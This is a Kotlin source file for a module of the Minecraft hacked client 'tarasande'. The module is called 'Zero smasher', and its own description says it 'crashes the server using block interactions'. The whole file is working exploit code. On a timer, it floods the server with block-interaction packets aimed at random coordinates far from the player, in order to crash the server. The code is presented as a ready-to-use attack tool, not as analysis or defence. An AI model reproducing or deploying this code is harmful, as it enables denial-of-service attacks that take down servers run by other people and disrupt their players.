package de.florianmichael.tarasande_crasher.module

import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket
import net.minecraft.util.Hand
import net.minecraft.util.hit.BlockHitResult
import net.minecraft.util.math.BlockPos
import net.minecraft.util.math.Direction
import net.minecraft.util.math.Vec3d
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueMode
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
import net.tarasandedevelopment.tarasande.util.extension.javaruntime.Thread
import net.tarasandedevelopment.tarasande.util.math.TimeUtil
import net.tarasandedevelopment.tarasande.util.string.StringUtil
import java.util.concurrent.ThreadLocalRandom

class ModuleZeroSmasher : Module("Zero smasher", "Crashes the server using block interactions", ModuleCategory.EXPLOIT) {

    private val hand = ValueMode(this, "Hand", false, *Hand.values().map { StringUtil.formatEnumTypes(it.name) }.toTypedArray())
    private val randomMultiply = ValueNumber(this, "Random multiply", 1000.0, 30000.0, 1000000.0, 1000.0)
    private val delay = ValueNumber(this, "Delay", 5.0, 50.0, 100.0, 5.0)

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (it.state == EventUpdate.State.POST) {
                if (timer.hasReached(delay.value.toLong())) {
                    if (mc.player!!.inventory.mainHandStack != null) {
                        mc.networkHandler!!.sendPacket(
                            PlayerInteractBlockC2SPacket(
                                if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND, BlockHitResult(
                                    Vec3d(
                                        ThreadLocalRandom.current().nextInt(randomMultiply.value.toInt()).toDouble(),
                                        mc.player!!.y,
                                        ThreadLocalRandom.current().nextInt(randomMultiply.value.toInt()).toDouble()
                                    ),
                                    Direction.NORTH,
                                    BlockPos(
                                        ThreadLocalRandom.current().nextInt(randomMultiply.value.toInt()),
                                        mc.player!!.y.toInt(),
                                        ThreadLocalRandom.current().nextInt(randomMultiply.value.toInt())
                                    ),
                                    false
                                ), 0
                            )
                        )
                    }
                    timer.reset()
                }
            }
        }
    }
}
